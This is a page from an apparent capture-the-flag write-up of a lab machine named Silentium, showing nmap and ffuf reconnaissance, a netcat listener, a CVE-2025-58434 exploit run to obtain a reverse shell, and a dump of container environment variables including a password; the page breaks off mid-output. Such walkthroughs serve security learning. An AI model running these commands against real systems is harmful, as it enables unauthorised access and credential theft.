@@ -1,0 +1,1258 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups Machines">
+      
+      
+        <meta name="author" content="HollowR00t">
+      
+      
+      
+        <link rel="prev" href="../Kobold/">
+      
+      
+        <link rel="next" href="../TwoMillons/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Index - HollowR00t's Machine Hacking</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="HollowR00t&#39;s Machine Hacking" class="md-header__button md-logo" aria-label="HollowR00t's Machine Hacking" data-md-component="logo">
+      
+  <img src="https://github.com/HollowR00t.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HollowR00t's Machine Hacking
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Index
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/HollowR00t/MachineHacking" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    HollowR00t/MachineHacking
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="HollowR00t&#39;s Machine Hacking" class="md-nav__button md-logo" aria-label="HollowR00t's Machine Hacking" data-md-component="logo">
+      
+  <img src="https://github.com/HollowR00t.png" alt="logo">
+
+    </a>
+    HollowR00t's Machine Hacking
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/HollowR00t/MachineHacking" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    HollowR00t/MachineHacking
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💀 Welcome
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../list/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📜 List Machines
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💻 Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💻 Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../CCTV/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CCTV
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CCTV
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../Cap/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cap
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cap
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../Interpreter/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Interpreter
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Interpreter
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../Kobold/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kobold
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Kobold
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="./" class="md-nav__link md-nav__link--active">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silentium
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Silentium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../TwoMillons/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TwoMillons
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TwoMillons
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../WingData/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WingData
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    WingData
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+  <h1>Index</h1>
+
+<p><img alt="" src="Assets/Pasted%20image%2020260429200804.png" /></p>
+<p><strong>Main Vectors:</strong> Container Breakout, API Abuse</p>
+<hr />
+<p>First we check with a ping if we have connection</p>
+<p><img alt="" src="Assets/Pasted%20image%2020260429200836.png" /></p>
+<p>Then make a nmap to see what ports the machine have open</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">500</span><span class="w"> </span><span class="m">10</span>.129.49.213
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.99<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-04-29<span class="w"> </span><span class="m">20</span>:09<span class="w"> </span>-0600
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.49.213
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.078s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">9</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu13.15<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.24.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.24.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>http://silentium.htb/
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+</code></pre></div>
+<p>Then you need to add in the file /etc/hosts like this <code>10.129.49.213     silentium.htb</code></p>
+<p>We will perform a web scan to find relevant routes and we see that we found a login which we found on another host.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>~/Dictionarys/seclist/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span>-u<span class="w"> </span>http://silentium.htb<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ.silentium.htb&quot;</span><span class="w"> </span>-mc<span class="w"> </span><span class="m">200</span><span class="w"> </span>-fs<span class="w"> </span><span class="m">8753</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">        </span>/<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span><span class="w">          </span>/<span class="err">&#39;</span>___<span class="se">\ </span><span class="w">      </span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">       </span>/<span class="se">\ \_</span>_/<span class="w"> </span>/<span class="se">\ \_</span>_/<span class="w">  </span>__<span class="w">  </span>__<span class="w">  </span>/<span class="se">\ \_</span>_/<span class="w">       </span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">       </span><span class="se">\ \ </span>,__<span class="se">\\</span><span class="w"> </span><span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span><span class="w">     </span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span><span class="se">\ \ \_</span>/<span class="w"> </span><span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/<span class="w">      </span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">         </span><span class="se">\ \_\ </span><span class="w">  </span><span class="se">\ \_\ </span><span class="w"> </span><span class="se">\ \_</span>___/<span class="w">  </span><span class="se">\ \_\ </span><span class="w">      </span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">          </span><span class="se">\/</span>_/<span class="w">    </span><span class="se">\/</span>_/<span class="w">   </span><span class="se">\/</span>___/<span class="w">    </span><span class="se">\/</span>_/<span class="w">       </span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">       </span>v2.1.0-dev
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>________________________________________________
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w"> </span>::<span class="w"> </span>Method<span class="w">           </span>:<span class="w"> </span>GET
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w"> </span>::<span class="w"> </span>URL<span class="w">              </span>:<span class="w"> </span>http://silentium.htb
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w"> </span>::<span class="w"> </span>Wordlist<span class="w">         </span>:<span class="w"> </span>FUZZ:<span class="w"> </span>/home/KEGA/Dictionarys/seclist/Discovery/DNS/subdomains-top1million-5000.txt
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w"> </span>::<span class="w"> </span>Header<span class="w">           </span>:<span class="w"> </span>Host:<span class="w"> </span>FUZZ.silentium.htb
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w"> </span>::<span class="w"> </span>Follow<span class="w"> </span>redirects<span class="w"> </span>:<span class="w"> </span><span class="nb">false</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w"> </span>::<span class="w"> </span>Calibration<span class="w">      </span>:<span class="w"> </span><span class="nb">false</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w"> </span>::<span class="w"> </span>Timeout<span class="w">          </span>:<span class="w"> </span><span class="m">10</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w"> </span>::<span class="w"> </span>Threads<span class="w">          </span>:<span class="w"> </span><span class="m">40</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w"> </span>::<span class="w"> </span>Matcher<span class="w">          </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w"> </span>::<span class="w"> </span>Filter<span class="w">           </span>:<span class="w"> </span>Response<span class="w"> </span>size:<span class="w"> </span><span class="m">8753</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>________________________________________________
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>staging<span class="w">                 </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">3142</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">789</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">70</span>,<span class="w"> </span>Duration:<span class="w"> </span>87ms<span class="o">]</span>
+</code></pre></div>
+<p>Now we just need to adjust the URL in /etc/hosts <code>staging.silentium.htb</code>.</p>
+<p><img alt="" src="Assets/Pasted%20image%2020260429210024.png" /></p>
+<p>We checked the source code, and we see that it gives us a version <code>3.0.5</code>. With this we can search for a CVE (<strong>CVE-2025-58434</strong>)</p>
+<p>So we use a exploit in python <code>CVE-2025-58434.py</code>, we see the email in the main menu for the first page.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># First Terminal </span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Second Terminal</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>python3<span class="w"> </span>CVE-2025-58434.py<span class="w"> </span>-u<span class="w"> </span>http://staging.silentium.htb<span class="w"> </span>-e<span class="w"> </span>ben@silentium.htb<span class="w"> </span>--lhost<span class="w"> </span><span class="m">10</span>.129.49.213<span class="w"> </span>--lport<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<p>The we can see nothing, so we check the file <code>env</code> to see if we have somenthin</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>/<span class="w"> </span><span class="c1"># env</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">FLOWISE_PASSWORD</span><span class="o">=</span>F1l3_d0ck3r
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nv">ALLOW_UNAUTHORIZED_CERTS</span><span class="o">=</span><span class="nb">true</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nv">NODE_VERSION</span><span class="o">=</span><span class="m">20</span>.19.4
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nv">HOSTNAME</span><span class="o">=</span>c78c3cceb7ba
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nv">YARN_VERSION</span><span class="o">=</span><span class="m">1</span>.22.22
